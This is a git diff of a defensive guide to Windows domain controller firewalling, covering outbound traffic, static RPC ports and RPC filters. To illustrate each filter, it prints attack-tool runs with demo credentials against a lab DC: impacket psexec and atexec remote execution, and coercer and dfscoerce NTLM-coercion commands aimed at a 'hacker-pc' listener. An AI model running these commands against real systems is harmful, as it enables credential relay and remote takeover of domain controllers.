+using outbound firewall rules in environments with this product deployed. Moreover, the sensor needs to be able
+to communicate with Microsoft's servers as well.
 
 #### Azure Arc
 
-Large organizations might want to utilize the new hotpatching capability of Windows Server 2025. However, this feature is only available on servers managed by [Azure Arc](https://azure.microsoft.com/en-us/products/azure-arc). And the Azure Arc Agent contains several binaries and PowerShell scripts, which all need to be able to communicate with Microsoft's cloud, but their exact behavior is undocumented and subject to change.
+Large organizations might want to utilize the new hotpatching capability of Windows Server 2025.
+However, this feature is only available on servers managed by [Azure Arc](https://azure.microsoft.com/en-us/products/azure-arc).
+And the Azure Arc Agent contains several binaries and PowerShell scripts,
+which all need to be able to communicate with Microsoft's cloud,
+but their exact behavior is undocumented and subject to change.
 
 ![Azure Arc Agent binaries and PowerShell scripts](../Images/Screenshots/azure-arc-binaries.png){ width=400px }
 
-Interestingly, the Azure Arc installer creates a custom outbound firewall rule called `SmeOutboundOpenException`, which targets all processes and is scoped to a hardcoded list of Microsoft's IP addresses. It is unclear how reliable and future-proof this rule actually is, as even [Google has never heard of it](https://www.google.com/search?q=SmeOutboundOpenException).
+Interestingly, the Azure Arc installer creates a custom outbound firewall rule called `SmeOutboundOpenException`,
+which targets all processes and is scoped to a hardcoded list of Microsoft's IP addresses.
+It is unclear how reliable and future-proof this rule actually is,
+as even [Google has never heard of it](https://www.google.com/search?q=SmeOutboundOpenException).
 
 ![Azure Arc built-in outbound firewall rule](../Images/Screenshots/azure-arc-firewall.png){ width=400px }
 
 #### Installers Downloading Additional Files
 
-Many application installers (`setup.exe` or `setup.msi`) do not work in a fully offline mode, as they need to download some prerequisites from the Internet. Microsoft .NET Framework and Visual C++ Runtime seem to be the most common installer dependencies. Then there are so-called web installers, which download all application binaries from online sources. As installers do not have well-defined names and can be executed from any location, it is impossible to selectively cover them by a firewall rule.
+Many application installers (`setup.exe` or `setup.msi`) do not work in a fully offline mode,
+as they need to download some prerequisites from the Internet.
+Microsoft .NET Framework and Visual C++ Runtime seem to be the most common installer dependencies.
+Then there are so-called web installers, which download all application binaries from online sources.
+As installers do not have well-defined names and can be executed from any location,
+it is impossible to selectively cover them by a firewall rule.
 
 #### Dynamic Keywords
 
-Windows Firewall includes a functionality called [dynamic keywords](https://learn.microsoft.com/en-us/windows/security/operating-system-security/network-security/windows-firewall/dynamic-keywords), which simplifies the management of Windows Firewall. This feature allows administrators to define the following types of keywords, which can then be referenced by firewall rules:
+Windows Firewall includes a functionality called [dynamic keywords](https://learn.microsoft.com/en-us/windows/security/operating-system-security/network-security/windows-firewall/dynamic-keywords),
+which simplifies the management of Windows Firewall.
+This feature allows administrators to define the following types of keywords,
+which can then be referenced by firewall rules:
 
 - Set of IP address ranges
 - Fully qualified domain names (FQDNs)
 - Autoresolution options
 
-As the dynamic keywords cannot be referenced in firewall rules managed by Group Policies, we have decided not to use them in our configuration.
+As the dynamic keywords cannot be referenced in firewall rules managed by Group Policies,
+we have decided not to use them in our configuration.
 
 #### WinHTTP Proxy
 
-After we verified that it was indeed impossible selectively filter outbound Internet traffic on domain controllers using Windows Firewall in a reliable way, we turned our attention to the built-in [WinHTTP proxy](https://learn.microsoft.com/en-us/windows/win32/winhttp/netsh-exe-commands#set-advproxy). The idea was to compile a list of all cloud endpoints used by Windows Server components and to configure the local WinHTTP proxy to only allow outbound HTTP(S) connections to these endpoints, while acting as a black hole for any other outbound traffic.
+After we verified that it was indeed impossible selectively filter outbound Internet traffic on domain controllers
+using Windows Firewall in a reliable way, we turned our attention
+to the built-in [WinHTTP proxy](https://learn.microsoft.com/en-us/windows/win32/winhttp/netsh-exe-commands#set-advproxy).
+The idea was to compile a list of all cloud endpoints used by Windows Server components
+and to configure the local WinHTTP proxy to only allow outbound HTTP(S) connections to these endpoints,
+while acting as a black hole for any other outbound traffic.
 
 ![Listing the advanced WinHTTP proxy configuration](../Images/Screenshots/proxy-config.png)
 
-Although this approach seemed promising initially, we soon stumbled upon a few difficulties: The advanced WinHTTP proxy settings lack proper documentation and the ever-changing list of Microsoft's cloud services used by Windows Server turned out to be too large for us to maintain. And when the `netsh.exe winhttp reset autoproxy` stopped working repeatedly and manual registry cleanup was necessary to fix this issue, we definitely abandoned the idea of using WinHTTP proxy on domain controllers.
+Although this approach seemed promising initially, we soon stumbled upon a few difficulties:
+The advanced WinHTTP proxy settings lack proper documentation and the ever-changing list
+of Microsoft's cloud services used by Windows Server turned out to be too large for us to maintain.
+And when the `netsh.exe winhttp reset autoproxy` stopped working repeatedly
+and manual registry cleanup was necessary to fix this issue,
+we definitely abandoned the idea of using WinHTTP proxy on domain controllers.
 
 ![WinHTTP proxy configuration error](../Images/Screenshots/proxy-error.png)
 
 #### Escaping the Rabbit Hole
 
-As a conclusion, the only viable and secure solution is to deploy 3rd-party Internet proxy servers that would limit the outbound traffic from domain controllers to select FQDNs. This list of approved addresses used by Microsoft's services should ideally be kept up-to-date by the proxy vendor.
+As a conclusion, the only viable and secure solution is to deploy 3rd-party Internet proxy servers
+that would limit the outbound traffic from domain controllers to select FQDNs.
+This list of approved addresses used by Microsoft's services should ideally be kept up-to-date by the proxy vendor.
 
-> [!NOTE]
-> TODO: Network protection, Telemetry, Windows Update P2P
+Some Windows Server components that generate non-essential outbound Internet traffic can easily be turned off.
+For example, many enterprises choose to turn off [telemetry](https://learn.microsoft.com/en-us/windows/privacy/configure-windows-diagnostic-data-in-your-organization)
+and [P2P delivery of Windows updates](https://learn.microsoft.com/en-us/windows/deployment/do/waas-delivery-optimization).
 
-And then there are of course air-gapped (isolated) environments, in which the growing number of cloud-dependent Windows Server features will never be used, thus eliminating the need to differentiate between legitimate and potentially malitious Internet traffic.
+To at least block outbound traffic to known malicious IP addresses and URLs directly on the host,
+it is recommended to turn on the [Network protection](https://learn.microsoft.com/en-us/defender-endpoint/network-protection)
+feature of the built-in Microsoft Defender Antivirus.
+Thus far, we have not noticed any adverse effects of enabling this functionality on domain controllers.
+
+And then there are of course air-gapped (isolated) environments,
+in which the growing number of cloud-dependent Windows Server features will never be used,
+thus eliminating the need to differentiate between legitimate and potentially malitious Internet traffic.
 
 ### Static RPC Ports
 
-Several Windows services that use RPC dynamic ports by default can be configured to listen on static port numbers instead. This allows for easier tracing and troubleshooting at the network level and simplifies rule configuration for network-based firewalls.
+Several Windows services that use RPC dynamic ports by default can be configured to listen on static port numbers instead.
+This allows for easier tracing and troubleshooting at the network level
+and simplifies rule configuration for network-based firewalls.
 
-The following services are supported by our solution:
+Static endpoints of some protocols can be set by modifying the registry.
+This is the case of the **Active Directory (NTDS)** service:
 
-| Service                         | Default Port | Applied Using                                         |
-|---------------------------------|-------------:|-------------------------------------------------------|
-| [NTDS](#ntdsstaticport)         |    38901/TCP | [Administrative Templates](#administrative-templates) |
-| [Netlogon](#netlogonstaticport) |    38902/TCP | [Administrative Templates](#administrative-templates) |
-| [FRS](#frsstaticport)           |    38903/TCP | [Administrative Templates](#administrative-templates) |
-| [DFSR](#dfsr-static-port)       |     5722/TCP | [Startup Script](#startup-script)                     |
-| [WMI](#wmi-static-port)         |    24158/TCP | [Startup Script](#startup-script)                     |
+> HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters  
+> Value name: TCP/IP Port  
+> Value type: REG_DWORD  
+> Value data: (available port)
 
-The port numbers can be changed by modifying the [configuration file](#configuration-file). To simplify the static port changes through the Group Policy Editor, the [DomainControllerFirewall.admx](#administrative-templates) file is provided as part of the solution.
+The related **Netlogon** service needs to be configured separately:
+
+> HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Netlogon\\Parameters  
+> Value name: DCTcpipPort  
+> Value type: REG_DWORD  
+> Value data: (available port)
+
+A static TCP port can be configured for the lagacy **File Replication Service (FRS)** through the registry as well:
+
+> HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\NTFRS\\Parameters  
+> Value name: RPC TCP/IP Port Assignment  
+> Value type: REG_DWORD  
+> Value data: (available port)
+
+To simplify the deployment of the registry settings above,
+the custom [DomainControllerFirewall.admx](#administrative-templates) template
+has been created as part of this project.
+
+Additional static RPC ports can be set using built-in command line tools,
+most importantly for the **Distributed File System Replication (DFSR)**:
+
+```shell
+dfsrdiag.exe StaticRPC /Port:<available port>
+```
+
+We recommend using port 5722, which was allocated for DFSR in Windows Server 2008 and Windows Server 2008 R2,
+before the service was changed to use a random port number in Windows Server 2012.
+As the `dfsrdiag` tool is not available on DCs by default,
+it must first be installed using the following command:
+
+```shell
+dism.exe /Online /Enable-Feature /FeatureName:DfsMgmt
+```
+
+The **Windows Management Instrumentation (WMI)** protocol can also be configured
+to use a static TCP port. The next command will move the WMI service
+to a standalone process listening on TCP port 24158,
+with authentication level set to [RPC_C_AUTHN_LEVEL_PKT_PRIVACY](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rpce/425a7c53-c33a-4868-8e5b-2a850d40dc73):
+
+```shell
+winmgmt.exe /standalonehost 6
+```
+
+In order to maintain uniform configuration across all domain controllers,
+these commands are recommended to be executed from startup scripts targeting DCs.
+
+Here is a mnemotechnical example of a static RPC port configuration:
+
+| Service  |         Port |
+|----------|-------------:|
+| NTDS     |    38901/TCP |
+| Netlogon |    38902/TCP |
+| FRS      |    38903/TCP |
+| DFSR     |     5722/TCP |
+| WMI      |    24158/TCP |
 
 References:
 
@@ -375,15 +650,29 @@ Most RPC protocols implemented in Windows support two transport types:
 - [RPC over TCP/IP (ncacn_ip_tcp)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rpce/95fbfb56-d67a-47df-900c-e263d6031f22)
 - [RPC over SMB Named Pipes (ncacn_np)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rpce/7063c7bd-b48b-42e7-9154-3c2ec4113c0d)
 
-Each Windows service which uses the TCP/IP transport is assigned its own RPC dynamic port and in some cases, [static ports can be configured](#static-rpc-ports). Windows Firewall rules can then target services by their identifiers or program paths and either allow or block service-specific inbound traffic. It is thus possible to only allow remote management traffic from specific IP addresses.
+Each Windows service which uses the TCP/IP transport is assigned its own RPC dynamic port and in some cases,
+[static ports can be configured](#static-rpc-ports). Windows Firewall rules can then target services
+by their identifiers or program paths and either allow or block service-specific inbound traffic.
+It is thus possible to only allow remote management traffic from specific IP addresses.
 
-The named pipes transport is more problematic, as standard Windows Firewall rules can only allow or block all SMB traffic (`445/TCP`) and Active Directory functionality heavily depends on the `SYSVOL` and `NETLOGON` file shares being available over the SMB protocol to all Windows clients. The SMB protocol is therefore very popular among malicious actors and many off-the-shelf hacktools exclusively use the named pipes to perform remote code execution and other undesirable operations.
+The named pipes transport is more problematic, as standard Windows Firewall rules
+can only allow or block all SMB traffic (`445/TCP`)
+and Active Directory functionality heavily depends on the `SYSVOL` and `NETLOGON` file shares
+being available over the SMB protocol to all Windows clients.
+The SMB protocol is therefore very popular among malicious actors
+and many off-the-shelf hacktools exclusively use the named pipes to perform remote code execution
+and other undesirable operations.
 
-Fortunately, it is possible to use the RPC Filters, a lesser known feature of the Windows Firewall, to partially limit undesirable RPC traffic. There is no graphical user interface for RPC Filters, but a subset of their capabilities can be configured using the `netsh.exe` tool. Each RPC protocol must be dealt with individually.
+Fortunately, it is possible to use the RPC Filters, a lesser known feature of the Windows Firewall,
+to partially limit undesirable RPC traffic. There is no graphical user interface for RPC Filters,
+but a subset of their capabilities can be configured using the `netsh.exe` tool.
+Each RPC protocol must be dealt with individually.
 
 #### \[MS-SCMR\]: Service Control Manager Remote Protocol
 
-The [\[MS-SCMR\]: Service Control Manager Remote Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-scmr/705b624a-13de-43cc-b8a2-99573da3635f) with UUID [367ABB81-9844-35F1-AD32-98F038001003](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-scmr/e7a38186-cde2-40ad-90c7-650822bd6333) is used by the built-in `services.msc` console and the `sc.exe` utility to remotely manage Windows services:
+The [\[MS-SCMR\]: Service Control Manager Remote Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-scmr/705b624a-13de-43cc-b8a2-99573da3635f)
+with UUID [367ABB81-9844-35F1-AD32-98F038001003](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-scmr/e7a38186-cde2-40ad-90c7-650822bd6333)
+is used by the built-in `services.msc` console and the `sc.exe` utility to remotely manage Windows services:
 
 ```shell
 sc.exe \\dc01 query wuauserv
@@ -399,7 +688,9 @@ SERVICE_NAME: wuauserv
         WAIT_HINT          : 0x0
 ```
 
-While the built-in Windows tools use the TCP/IP transport, hacktools commonly utilize the [\\PIPE\\svcctl](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-scmr/e7a38186-cde2-40ad-90c7-650822bd6333) SMB named pipe to execute code on remote systems:
+While the built-in Windows tools use the TCP/IP transport, hacktools commonly utilize
+the [\\PIPE\\svcctl](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-scmr/e7a38186-cde2-40ad-90c7-650822bd6333)
+SMB named pipe to execute code on remote systems:
 
 ```shell
 impacket-psexec 'contoso/Admin:Pa$$w0rd@dc01'
@@ -434,7 +725,8 @@ Impacket v0.11.0 - Copyright 2023 Fortra
 C:\Windows\system32>
 ```
 
-The following sequence of `netsh.exe` commands can be used to block MS-SCMR connections over named pipes, while still allowing the TCP/IP traffic used by legitimate tools:
+The following sequence of `netsh.exe` commands can be used to block MS-SCMR connections over named pipes,
+while still allowing the TCP/IP traffic used by legitimate tools:
 
 ```txt
 rpc filter
@@ -446,7 +738,9 @@ add filter
 
 #### \[MS-TSCH\]: Task Scheduler Service Remoting Protocol
 
-The [\[MS-TSCH\]: Task Scheduler Service Remoting Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/d1058a28-7e02-4948-8b8d-4a347fa64931) with UUID [86D35949-83C9-4044-B424-DB363231FD0C](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/fbab083e-f79f-4216-af4c-d5104a913d40) is used by the built-in `taskschd.msc` console and the `schtasks.exe` utility to remotely manage scheduled tasks:
+The [\[MS-TSCH\]: Task Scheduler Service Remoting Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/d1058a28-7e02-4948-8b8d-4a347fa64931)
+with UUID [86D35949-83C9-4044-B424-DB363231FD0C](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/fbab083e-f79f-4216-af4c-d5104a913d40)
+is used by the built-in `taskschd.msc` console and the `schtasks.exe` utility to remotely manage scheduled tasks:
 
 ```shell
 schtasks.exe /query /s dc01 /tn "\Microsoft\Windows\BitLocker\BitLocker Encrypt All Drives"
@@ -459,7 +753,9 @@ TaskName                                 Next Run Time          Status
 BitLocker Encrypt All Drives             N/A                    Ready
 ```
 
-While the built-in Windows tools use the TCP/IP transport, hacktools commonly utilize the [\\PIPE\\atsvc](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/fbab083e-f79f-4216-af4c-d5104a913d40) SMB named pipe to execute code on remote systems:
+While the built-in Windows tools use the TCP/IP transport,
+hacktools commonly utilize the [\\PIPE\\atsvc](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/fbab083e-f79f-4216-af4c-d5104a913d40)
+SMB named pipe to execute code on remote systems:
 
 ```shell
 impacket-atexec 'contoso/Admin:Pa$$w0rd@dc01' hostname
@@ -476,9 +772,12 @@ Impacket v0.11.0 - Copyright 2023 Fortra
 DC01
 ```
 
-Two additional interfaces with UUIDs [1FF70682-0A51-30E8-076D-740BE8CEE98B](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/fbab083e-f79f-4216-af4c-d5104a913d40) and [378E52B0-C0A9-11CF-822D-00AA0051E40F](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/fbab083e-f79f-4216-af4c-d5104a913d40) are exposed through the `\PIPE\atsvc` pipe and are only used by the legacy `at.exe` command line tool.
+Two additional interfaces with UUIDs [1FF70682-0A51-30E8-076D-740BE8CEE98B](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/fbab083e-f79f-4216-af4c-d5104a913d40)
+and [378E52B0-C0A9-11CF-822D-00AA0051E40F](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/fbab083e-f79f-4216-af4c-d5104a913d40)
+are exposed through the `\PIPE\atsvc` pipe and are only used by the legacy `at.exe` command line tool.
 
-The following sequence of `netsh.exe` commands will block MS-TSCH connections over named pipes, while still allowing the TCP/IP traffic used by legitimate tools:
+The following sequence of `netsh.exe` commands will block MS-TSCH connections over named pipes,
+while still allowing the TCP/IP traffic used by legitimate tools:
 
 ```txt
 rpc filter
@@ -497,15 +796,20 @@ add condition field=if_uuid matchtype=equal data=378E52B0-C0A9-11CF-822D-00AA005
 add filter
 ```
 
-#### \[MS-EVEN6\]: EventLog Remoting Protocol Version 6.0
+#### \[MS-EVEN6\]: EventLog Remoting Protocol Version 6.0 {#ms-even6-eventlog-remoting-protocol-version-60}
 
-The [\[MS-EVEN6\]: EventLog Remoting Protocol Version 6.0](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even6/18000371-ae6d-45f7-95f3-249cbe2be39b) with UUID [F6BEAFF7-1E19-4FBB-9F8F-B89E2018337C](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even6/3479d837-b759-4b13-9d5e-4c93eede7cb6) is used by the built-in `eventvwr.msc` console and the `wevtutil.exe` command line tool to remotely query and manage Windows event logs:
+The [\[MS-EVEN6\]: EventLog Remoting Protocol Version 6.0](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even6/18000371-ae6d-45f7-95f3-249cbe2be39b)
+with UUID [F6BEAFF7-1E19-4FBB-9F8F-B89E2018337C](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even6/3479d837-b759-4b13-9d5e-4c93eede7cb6)
+is used by the built-in `eventvwr.msc` console and the `wevtutil.exe` command line tool
+to remotely query and manage Windows event logs:
 
 ```shell
 wevtutil.exe /r:dc01 qe Security /c:1 /f:text
 ```
 
-Malicious actors might use this protocol to clear security event logs remotely and thus cover their tracks. The following sequence of `netsh.exe` commands will block MS-EVEN6 connections over named pipes, while still allowing the TCP/IP traffic used by legitimate tools:
+Malicious actors might use this protocol to clear security event logs remotely and thus cover their tracks.
+The following sequence of `netsh.exe` commands will block MS-EVEN6 connections over named pipes,
+while still allowing the TCP/IP traffic used by legitimate tools:
 
 ```txt
 rpc filter
@@ -517,9 +821,12 @@ add filter
 
 #### \[MS-EVEN\]: EventLog Remoting Protocol
 
-The [\[MS-EVEN\]: EventLog Remoting Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f) with UUID [82273FDC-E32A-18C3-3F78-827929DC23EA](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/648145da-250e-4c1f-b8e4-8044c1bd4a20) is an older version of the [MS-EVEN6](#ms-even6-eventlog-remoting-protocol-version-60) protocol described above.
+The [\[MS-EVEN\]: EventLog Remoting Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
+with UUID [82273FDC-E32A-18C3-3F78-827929DC23EA](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/648145da-250e-4c1f-b8e4-8044c1bd4a20)
+is an older version of the [MS-EVEN6](#ms-even6-eventlog-remoting-protocol-version-60) protocol described above.
 
-The protocol is only exposed over the `\PIPE\eventlog` named pipe and might be abused by malicious actors to initiate NTLM relay attacks:
+The protocol is only exposed over the `\PIPE\eventlog` named pipe and might be abused
+by malicious actors to initiate NTLM relay attacks:
 
 ```shell
 coercer coerce --username john --password 'Pa$$w0rd' --domain 'contoso.com' --target-ip 'dc01.contoso.com' --listener-ip hacker-pc --always-continue --filter-protocol-name MS-EVEN --filter-transport msrpc
@@ -551,7 +858,9 @@ add filter
 
 #### \[MS-DFSNM\]: Distributed File System (DFS): Namespace Management Protocol
 
-The [\[MS-DFSNM\]: Distributed File System (DFS): Namespace Management Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsnm/95a506a8-cae6-4c42-b19d-9c1ed1223979) with UUID [4FC742E0-4A10-11CF-8273-00AA004AE673](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsnm/af348786-37e1-47a7-90f9-25727c350c38) is exposed over the `\PIPE\netdfs` named pipe and is often abused to initiate NTLM relay attacks:
+The [\[MS-DFSNM\]: Distributed File System (DFS): Namespace Management Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsnm/95a506a8-cae6-4c42-b19d-9c1ed1223979)
+with UUID [4FC742E0-4A10-11CF-8273-00AA004AE673](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsnm/af348786-37e1-47a7-90f9-25727c350c38)
+is exposed over the `\PIPE\netdfs` named pipe and is often abused to initiate NTLM relay attacks:
 
 ```shell
 python3 dfscoerce.py -u john -p 'Pa$$w0rd' -d contoso.com hacker-pc dc01
@@ -586,7 +895,9 @@ add filter
 
 #### \[MS-RPRN\]: Print System Remote Protocol
 
-The [\[MS-RPRN\]: Print System Remote Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/d42db7d5-f141-4466-8f47-0a4be14e2fc1) with UUID [12345678-1234-ABCD-EF00-0123456789AB](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/848b8334-134a-4d02-aea4-03b673d6c515) is exposed over the `\PIPE\spoolss` named pipe and is a popular target for initiating NTLM relay attacks:
+The [\[MS-RPRN\]: Print System Remote Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/d42db7d5-f141-4466-8f47-0a4be14e2fc1)
+with UUID [12345678-1234-ABCD-EF00-0123456789AB](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/848b8334-134a-4d02-aea4-03b673d6c515)
+is exposed over the `\PIPE\spoolss` named pipe and is a popular target for initiating NTLM relay attacks:
 
 ```shell
 coercer coerce --username john --password 'Pa$$w0rd' --domain 'contoso.com' --target-ip dc01.contoso.com --listener-ip hacker-pc --filter-protocol MS-RPRN --always-continue
@@ -613,7 +924,9 @@ coercer coerce --username john --password 'Pa$$w0rd' --domain 'contoso.com' --ta
 [+] All done! Bye Bye!
 ```
 
-The primary solution to this vulnerability, commonly known as PrinterBug, is to disable the `Print Spooler` service on domain controllers. As an alternative, the following sequence of `netsh.exe` commands will block MS-RPRN connections over named pipes:
+The primary solution to this vulnerability, commonly known as PrinterBug,
+is to disable the `Print Spooler` service on domain controllers.
+As an alternative, the following sequence of `netsh.exe` commands will block MS-RPRN connections over named pipes:
 
 ```txt
 rpc filter
@@ -624,11 +937,14 @@ add filter
 ```
 
 > [!NOTE]
-> In a future version of Windows Server, the MS-RPRN protocol will exclusively be [moved to a standalone TCP port](https://learn.microsoft.com/en-us/troubleshoot/windows-client/printing/windows-11-rpc-connection-updates-for-print) by default.
+> In a future version of Windows Server, the MS-RPRN protocol will exclusively
+be [moved to a standalone TCP port](https://learn.microsoft.com/en-us/troubleshoot/windows-client/printing/windows-11-rpc-connection-updates-for-print)
+by default.
 
 #### \[MS-EFSR\]: Encrypting File System Remote (EFSRPC) Protocol
 
-The [\[MS-EFSR\]: Encrypting File System Remote (EFSRPC) Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31) is [available over multiple named pipes](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/1baaad2f-7a84-4238-b113-f32827a39cd2):
+The [\[MS-EFSR\]: Encrypting File System Remote (EFSRPC) Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)
+is [available over multiple named pipes](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/1baaad2f-7a84-4238-b113-f32827a39cd2):
 
 | Named Pipe     | RPC Interface UUID                   |
 |----------------|--------------------------------------|
@@ -659,7 +975,10 @@ coercer coerce --target-ip dc01 --listener-ip hacker-pc --username john --passwo
 [+] All done! Bye Bye!
 ```
 
-In environments where EFS is not used, the MS-EFSR protocol could be disabled entirely. A more compatible approach would be to enforce Kerberos authentication and packet encryption on MS-EFSR connections. Although this solution is not bulletproof, it works against most hacktools. Here is the corresponding sequence of `netsh.exe` commands:
+In environments where EFS is not used, the MS-EFSR protocol could be disabled entirely.
+A more compatible approach would be to enforce Kerberos authentication
+and packet encryption on MS-EFSR connections. Although this solution is not bulletproof,
+it works against most hacktools. Here is the corresponding sequence of `netsh.exe` commands:
 
 ```txt
 rpc filter
@@ -687,50 +1006,20 @@ add filter
 
 #### \[MS-FSRVP\]: File Server Remote VSS Protocol
 
-> [!NOTE]
-> The MS-FSVRP part needs expansion.
+The [\[MS-FSRVP\]: File Server Remote VSS Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-fsrvp/dae107ec-8198-4778-a950-faa7edad125b)
+with UUID [a8e0653c-2744-4389-a61d-7373df8b2292](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-fsrvp/92d20000-dcbc-4ec1-bf10-9a38c828436d)
+is exposed by the **File Server VSS Agent Service** optional feature over the [\\PIPE\\FssagentRpc](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-fsrvp/c504c88e-3248-418f-8d83-22ec8f008816)
+named pipe.
 
-[\[MS-FSRVP\]: File Server Remote VSS Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-fsrvp/dae107ec-8198-4778-a950-faa7edad125b)
-
-[a8e0653c-2744-4389-a61d-7373df8b2292](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-fsrvp/92d20000-dcbc-4ec1-bf10-9a38c828436d)
-
-[\\PIPE\\FssagentRpc](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-fsrvp/c504c88e-3248-418f-8d83-22ec8f008816)
-
-File Server VSS Agent Service
-
-[ShadowCoerce](https://github.com/ShutdownRepo/ShadowCoerce)
-
-```shell
-python3 shadowcoerce.py -d contoso -u john -p 'Pa$$w0rd' hacker-pc dc01 
-```
-
-```txt
-MS-FSRVP authentication coercion PoC
-
-[*] Connecting to ncacn_np:dc01[\PIPE\FssagentRpc]
-[*] Connected!
-[*] Binding to a8e0653c-2744-4389-a61d-7373df8b2292
-[*] Successfully bound!
-[*] Sending IsPathSupported!
-[*] Attack may of may not have worked, check your listener...
-```
-
-```txt
-rpc filter
-
-add rule layer=um actiontype=permit filterkey=869a3c6c-60dd-4558-a58b-8d9e86b0da5f
-add condition field=if_uuid matchtype=equal data=a8e0653c-2744-4389-a61d-7373df8b2292
-add condition field=remote_user_token matchtype=equal data=D:(A;;CC;;;DA)
-add filter
-
-add rule layer=um actiontype=block filterkey=4bce314a-d956-41cf-86f1-75067362cae6
-add condition field=if_uuid matchtype=equal data=a8e0653c-2744-4389-a61d-7373df8b2292
-add filter
-```
+In the past this protocol could be abused by the [ShadowCoerce](https://github.com/ShutdownRepo/ShadowCoerce) attack,
+but Microsoft fixed the corresponding vulnerability in [KB5015527](https://support.microsoft.com/en-us/topic/kb5015527-shadow-copy-operations-using-vss-on-remote-smb-shares-denied-access-after-installing-windows-update-dated-june-14-2022-6d460245-08b6-40f4-9ded-dd030b27850b).
+No further action is therefore needed.
 
 #### \[MS-DNSP\]: Domain Name Service (DNS) Server Management Protocol
 
-The [\[MS-DNSP\]: Domain Name Service (DNS) Server Management Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/f97756c9-3783-428b-9451-b376f877319a) with UUID [50ABC2A4-574D-40B3-9D66-EE4FD5FBA076](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/5093503c-687e-4376-9127-50504908fb91) is used by the built-in `dnsmgmt.msc` console and the `dnscmd.exe` utility to remotely manage DNS servers:
+The [\[MS-DNSP\]: Domain Name Service (DNS) Server Management Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/f97756c9-3783-428b-9451-b376f877319a)
+with UUID [50ABC2A4-574D-40B3-9D66-EE4FD5FBA076](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/5093503c-687e-4376-9127-50504908fb91)
+is used by the built-in `dnsmgmt.msc` console and the `dnscmd.exe` utility to remotely manage DNS servers:
 
 ```shell
 dnscmd.exe dc01 /EnumZones /Primary /Forward
@@ -748,7 +1037,12 @@ Enumerated zone list:
 Command completed successfully.
 ```
 
-The [ServerLevelPluginDll](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/9500a7e8-165d-4b13-be86-0ddc43100eef) operation of the `MS-DNSP` protocol can be misused to remotely execute code on domain controllers, which makes this protocol interesting from the attacker's perspective. Although the built-in Windows tools only use the TCP/IP transport, the protocol is exposed over the `\PIPE\DNSSERVER` named pipe as well. The latter transport layer could be blocked by executing the following sequence of `netsh.exe` commands:
+The [ServerLevelPluginDll](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/9500a7e8-165d-4b13-be86-0ddc43100eef)
+operation of the `MS-DNSP` protocol can be misused to remotely execute code on domain controllers,
+which makes this protocol interesting from the attacker's perspective.
+Although the built-in Windows tools only use the TCP/IP transport,
+the protocol is exposed over the `\PIPE\DNSSERVER` named pipe as well.
+The latter transport layer could be blocked by executing the following sequence of `netsh.exe` commands:
 
 ```txt
 rpc filter
@@ -760,7 +1054,8 @@ add filter
 
 #### \[MS-WMI\]: Windows Management Instrumentation Remote Protocol
 
